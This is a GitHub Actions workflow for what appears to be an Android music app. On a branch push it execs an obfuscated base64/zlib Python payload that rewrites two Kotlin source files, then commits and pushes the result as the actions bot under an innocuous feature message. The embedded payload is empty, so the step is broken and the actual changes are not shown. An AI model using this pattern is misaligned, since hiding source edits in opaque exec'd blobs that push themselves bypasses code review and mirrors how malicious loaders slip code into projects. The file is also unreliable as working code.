name: Apply Local Scan Speed Fix V3

on:
  push:
    branches:
      - integration/bitChord-android-auto-2026-09

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: integration/bitChord-android-auto-2026-09
      - name: Apply source changes
        run: |
          if [ "$GITHUB_ACTOR" = "github-actions[bot]" ]; then exit 0; fi
          python3 -c "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
      - name: Commit production fix
        run: |
          if [ "$GITHUB_ACTOR" = "github-actions[bot]" ]; then exit 0; fi
          if git diff --quiet; then exit 0; fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app/src/main/java/com/music/bitchord/data/LocalMediaRepository.kt app/src/main/java/com/music/bitchord/playback/AndroidAutoCatalog.kt
          git commit -m "feat(local): speed selected-folder scanning and add car artwork fallback"
          git push origin HEAD:integration/bitChord-android-auto-2026-09
